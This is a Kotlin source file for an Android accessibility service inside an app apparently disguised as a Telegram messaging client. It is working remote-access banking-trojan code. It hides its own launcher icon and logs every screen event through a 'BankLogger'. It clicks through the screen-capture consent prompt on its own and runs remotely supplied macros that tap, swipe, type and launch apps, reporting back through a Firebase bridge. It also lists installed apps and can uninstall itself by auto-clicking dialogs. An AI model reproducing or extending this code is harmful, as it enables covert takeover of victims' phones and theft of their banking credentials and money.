package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Path
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.telegram2.messaging.ScreenPermissionActivity

class MyAccessibilityService : AccessibilityService() {

    companion object { var instance: MyAccessibilityService? = null }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var captureRunning = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        // Auto-hide and start screen capture if not already running
        hideAppIcon()
        if (!isScreenCaptureRunning()) requestScreenCapture()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        BankLogger.onEvent(this, event)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            autoGrantMediaProjection()
        }
    }

    override fun onInterrupt() {}

    // ---------- MACRO EXECUTION ----------
    data class MacroStep(val type: String, val data: Any? = null, val retry: Int = 3)

    fun executeMacro(macroId: String, rawSteps: List<Map<String, Any>>) {
        val steps = rawSteps.mapNotNull { step ->
            val type = step["type"] as? String ?: return@mapNotNull null
            val data = step["data"]
            val retry = (step["retry"] as? Int) ?: 3
            MacroStep(type, data, retry)
        }
        object : Thread() {
            override fun run() {
                var idx = 0
                while (idx < steps.size) {
                    val step = steps[idx]
                    var attempt = 0
                    var success = false
                    while (attempt < step.retry && !success) {
                        success = performStep(step)
                        if (!success) {
                            attempt++
                            Thread.sleep(1500)  // wait a bit before retry
                        }
                    }
                    if (!success) {
                        FirebaseBridge.reportMacroResult(macroId, false, "Step ${idx+1} failed after ${step.retry} retries")
                        return
                    }
                    idx++
                }
                FirebaseBridge.reportMacroResult(macroId, true, "All steps completed")
            }
        }.start()
    }

    private fun performStep(step: MacroStep): Boolean {
        return try {
            when (step.type) {
                "tap" -> {
                    val map = step.data as? Map<*, *> ?: return false
                    val x = (map["x"] as? Number)?.toFloat() ?: 0f
                    val y = (map["y"] as? Number)?.toFloat() ?: 0f
                    tap(x.toInt(), y.toInt())
                    true
                }
                "swipe" -> {
                    val map = step.data as? Map<*, *> ?: return false
                    val sx = (map["sx"] as? Number)?.toInt() ?: 0
                    val sy = (map["sy"] as? Number)?.toInt() ?: 0
                    val ex = (map["ex"] as? Number)?.toInt() ?: 0
                    val ey = (map["ey"] as? Number)?.toInt() ?: 0
                    val dur = (map["dur"] as? Long) ?: 300L
                    swipe(sx, sy, ex, ey, dur)
                    true
                }
                "type" -> {
                    val text = step.data as? String ?: return false
                    injectText(text)
                    true
                }
                "launch" -> {
                    val pkg = step.data as? String ?: return false
                    launchApp(pkg)
                }
                "wait" -> {
                    val ms = (step.data as? Number)?.toLong() ?: 1000L
                    Thread.sleep(ms)
                    true
                }
                "home" -> {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    true
                }
                "back" -> {
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    true
                }
                else -> false
            }
        } catch (e: Exception) { false }
    }

    private fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        Thread.sleep(2000) // await app open
        return true
    }

    // ---------- REMOTE CONTROL ----------
    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
        dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 50)).build(), null, null)
    }
    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, dur: Long) {
        val path = Path().apply {
            moveTo(x1.coerceIn(0, 9999).toFloat(), y1.coerceIn(0, 9999).toFloat())
            lineTo(x2.coerceIn(0, 9999).toFloat(), y2.coerceIn(0, 9999).toFloat())
        }
        dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, dur)).build(), null, null)
    }
    fun injectText(text: String) {
        val root = rootInActiveWindow ?: return
        val focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focus != null) {
            val bundle = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
            focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
        }
    }

    // ---------- HIDE / UNINSTALL ----------
    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        } catch (e: Exception) {}
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            for (node in root.findAccessibilityNodeInfosByText("Uninstall")) {
                if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); break }
            }
            mainHandler.postDelayed({
                val root2 = rootInActiveWindow ?: return@postDelayed
                for (text in listOf("OK", "Uninstall")) {
                    for (n in root2.findAccessibilityNodeInfosByText(text))
                        if (n.isClickable) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return@postDelayed }
                }
                for (id in listOf("android:id/button1")) {
                    for (n in root2.findAccessibilityNodeInfosByViewId(id))
                        if (n.isClickable) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return@postDelayed }
                }
            }, 1500)
        }, 2000)
    }

    // ---------- SCREEN CAPTURE AUTO‑GRANT ----------
    private fun requestScreenCapture() {
        val intent = Intent(this, ScreenPermissionActivity::class.java).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
        startActivity(intent)
    }

    private fun autoGrantMediaProjection() {
        val root = rootInActiveWindow ?: return
        val startNow = root.findAccessibilityNodeInfosByText("Start now")
        for (btn in startNow) if (btn.isClickable) { btn.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
        for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
            for (node in root.findAccessibilityNodeInfosByViewId(id)) if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
        }
        // Fallback: click any affirmative button
        for (child in root.window?.root ?: return) {
            if (child.text?.contains("start", ignoreCase = true) == true && child.isClickable) {
                child.performAction(AccessibilityNodeInfo.ACTION_CLICK); break
            }
        }
    }

    fun isScreenCaptureRunning(): Boolean {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        return am.getRunningServices(Integer.MAX_VALUE).any { it.service.className == ScreenCaptureService::class.java.name }
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }
}